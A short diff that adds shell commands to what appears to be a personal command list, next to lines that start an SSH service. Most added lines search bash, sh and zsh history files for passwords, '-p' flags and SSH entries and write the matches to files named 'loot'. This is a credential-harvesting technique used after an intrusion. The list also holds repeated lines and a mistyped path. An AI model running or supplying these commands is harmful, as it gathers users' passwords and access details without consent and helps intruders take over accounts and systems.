@@ -1,2 +1,9 @@
 ssh start
 sudo ssh start
+cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt
+cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
+cat ~/.shh | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
+cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
+sudo /etc/init.d/ssh start
+cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
+cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt
